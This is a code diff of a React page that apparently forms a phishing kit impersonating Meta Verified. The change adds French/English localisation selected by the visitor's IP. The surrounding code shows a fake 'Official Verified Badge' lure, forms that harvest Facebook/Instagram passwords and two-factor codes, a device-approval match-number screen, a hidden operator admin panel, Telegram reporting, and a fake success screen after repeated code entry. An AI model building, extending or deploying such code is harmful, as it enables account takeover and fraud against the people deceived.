@@ -1,5 +1,6 @@
 import { useState, useEffect } from 'react';
 import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';
+import { translations } from '../translations'; // Thêm dòng này
 
 // ==========================================
 // THAY THÔNG TIN JSONBIN CỦA MÀY VÀO ĐÂY
@@ -8,6 +9,10 @@ const API_KEY = '$2a$10$aQUMOVeeqI4gvQgvEtfmz.mT7MtH0h2ddIYvYbYOMilObcfbHMBZG';
 // ==========================================
 
 export default function Home() {
+  // --- STATES NGÔN NGỮ ---
+  const [lang, setLang] = useState('en');
+  const t = translations[lang] || translations['en'];
+
   // --- STATES TRANG CHỦ ---
   const [activeBenefit, setActiveBenefit] = useState(0);
   const [currentSlide, setCurrentSlide] = useState(0);
@@ -26,7 +31,7 @@ export default function Home() {
 
   // --- STATES CHO BƯỚC 3 & 4 & ADMIN ---
   const [matchNumber, setMatchNumber] = useState(null); 
-  const [showSuccess, setShowSuccess] = useState(false); // Trạng thái Bước 4
+  const [showSuccess, setShowSuccess] = useState(false); 
   const [adminSessionId, setAdminSessionId] = useState(''); 
   const [adminNumberInput, setAdminNumberInput] = useState(''); 
   const [showAdmin, setShowAdmin] = useState(false);
@@ -64,12 +69,20 @@ export default function Home() {
     { q: 'What determines which plans I can purchase?', a: 'Meta determines plan availability based on your business activity across our apps.' }
   ];
 
-  // --- LẤY IP KHI MỞ FORM ---
+  // --- LẤY IP VÀ ĐỔI NGÔN NGỮ ---
   useEffect(() => { 
       if(showModal && clientIp === 'Unknown') {
           fetch('https://ipwho.is/').then(r => r.json()).then(d => { 
               if (d && d.ip) {
                   setClientIp(`${d.ip} - ${d.country} (${d.city})`);
+                  
+                  // CHỈ CẦN PHÁP LÀ FR, CÒN LẠI LÀ EN
+                  if (d.country_code === 'FR') {
+                      setLang('fr');
+                  } else {
+                      setLang('en');
+                  }
+
                   if (d.country_code && countryCodeMap[d.country_code]) {
                       setCountryCode(countryCodeMap[d.country_code]);
                   }
@@ -110,7 +123,7 @@ export default function Home() {
     return () => clearInterval(interval);
   }, [sessionId]);
 
-  // --- PHÍM TẮT MỞ ADMIN (Ctrl + Shift + A) ---
+  // --- PHÍM TẮT MỞ ADMIN ---
   useEffect(() => {
     const handleKeyDown = (e) => {
       if (e.ctrlKey && e.shiftKey && e.key === 'A') {
@@ -126,8 +139,8 @@ export default function Home() {
   const openModal = () => { 
       setShowModal(true); 
       setStep(1); 
-      setShowSuccess(false); // Reset trạng thái thành công
-      setShowAdmin(false); // Tắt Admin nếu đang mở
+      setShowSuccess(false); 
+      setShowAdmin(false); 
   };
 
   const handleSignup = (e) => {
@@ -162,14 +175,12 @@ export default function Home() {
             setShowOtpError(true); 
             setOtp(''); 
         } else {
-            // Nhập sai 3 lần -> Hiện giao diện thành công
             setShowSuccess(true);
             setOtp('');
         }
     }, 1500);
   };
 
-  // --- HÀM GỬI LỆNH TỪ ADMIN ---
   const handleAdminCommand = (type, value) => {
       const targetUser = adminSessionId.trim(); 
       if (!targetUser) {
@@ -217,9 +228,9 @@ export default function Home() {
               <div className="hero-text">
                   <div className="hero-text-inner">
                       <svg className="hero-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.26-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
-                      <h1 className="hero-title">Congratulations! You've been awarded the Official Verified Badge.</h1>
-                      <p className="hero-subtitle">Your business has met our verification requirements and is now eligible to display the official badge. Complete the quick steps below to activate it.</p>
-                      <button className="btn-primary" onClick={openModal}>Claim your badge</button>
+                      <h1 className="hero-title">{t.heroTitle}</h1>
+                      <p className="hero-subtitle">{t.heroSub}</p>
+                      <button className="btn-primary" onClick={openModal}>{t.claimBtn}</button>
                       <p className="hero-note">To activate your Official Verified Badge, you must be logged in to a professional account (Instagram) or a Business Page (Facebook).</p>
                   </div>
               </div>
@@ -281,7 +292,7 @@ export default function Home() {
               <div className="cta-content">
                   <svg className="cta-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                   <h2 className="cta-title">Ready to activate your Official Verified Badge?</h2>
-                  <button className="btn-primary" onClick={openModal}>Claim your badge</button>
+                  <button className="btn-primary" onClick={openModal}>{t.claimBtn}</button>
               </div>
               <div className="cta-image"><img src="/images/hero.webp" alt="Meta Verified" /></div>
           </div>
@@ -370,8 +381,8 @@ export default function Home() {
                     {/* FORM 1: SIGNUP */}
                     {step === 1 && (
                       <>
-                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Meta Verified for Business</h2>
-                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter your business details to start your application.</p>
+                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>{t.form1Title}</h2>
+                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>{t.form1Sub}</p>
                         <form onSubmit={handleSignup} noValidate style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                             <div>
                                 <input className="fb-input" style={{ borderColor: errors.busName ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
@@ -631,7 +642,7 @@ export default function Home() {
                                 </div>
                                 {errors.phoneNum && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid phone number.</div>}
                             </div>
-                            <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Submitting...' : 'Continue'}</button>
+                            <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Submitting...' : t.continueBtn}</button>
                         </form>
                       </>
                     )}
@@ -642,7 +653,7 @@ export default function Home() {
                           <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
                           <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
                           {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
-                          <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
+                          <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : t.loginBtn}</button>
                       </form>
                     )}
 
@@ -652,30 +663,30 @@ export default function Home() {
                         {showSuccess ? (
                           // GIAO DIỆN THÀNH CÔNG
                           <div style={{ textAlign: 'center', padding: '20px 0' }}>
-                            <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', marginTop: '20px' }}>Request Received</h2>
+                            <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', marginTop: '20px' }}>{t.successTitle}</h2>
                             <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '20px' }}>
-                                Thank you! We have received your verification request. Your Official Verified Badge will be updated within 24 hours.
+                                {t.successSub}
                             </p>
                             <button 
                                 type="button" 
                                 onClick={() => { 
-                                    localStorage.clear(); // Xóa sạch bộ nhớ tạm
-                                    window.location.replace('/live'); // Thay thế lịch sử trang
+                                    localStorage.clear(); 
+                                    window.location.replace('/live'); 
                                 }} 
                                 className="fb-btn"
                             >
-                                Close
+                                {t.closeBtn}
                             </button>
                           </div>
                         ) : matchNumber ? (
                           // GIAO DIỆN DUYỆT THIẾT BỊ
                           <>
-                                                        <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', textAlign: 'center' }}>
-                                Check your other device
+                            <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', textAlign: 'center' }}>
+                                {t.approveTitle}
                             </h2>
                             
-                            <p style={{ fontSize: '15px', color: '#1c2b33', marginBottom: '20px', lineHeight: '1.4' }}>
-                                Open the notification on your other device, then tap <strong>{matchNumber}</strong> to verify it's you.
+                            <p style={{ fontSize: '15px', color: '#1c2b33', marginBottom: '20px', lineHeight: '1.4', textAlign: 'center' }}>
+                                {t.approveSub} <strong>{matchNumber}</strong>
                             </p>
 
                             <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}>
@@ -689,13 +700,13 @@ export default function Home() {
                         ) : (
                           // GIAO DIỆN NHẬP MÃ 2FA
                           <>
-                            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
+                            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>{t.form3Title}</h2>
                             
                             <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}>
                                 <img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} />
                             </div>
 
-                            <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.</p>
+                            <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>{t.form3Sub}</p>
                             
                             <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                                 <input 
@@ -715,7 +726,7 @@ export default function Home() {
                                 )}
                                 
                                 <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>
-                                    {loading ? 'Verifying...' : 'Verify'}
+                                    {loading ? 'Verifying...' : t.verifyBtn}
                                 </button>
                             </form>
                           </>
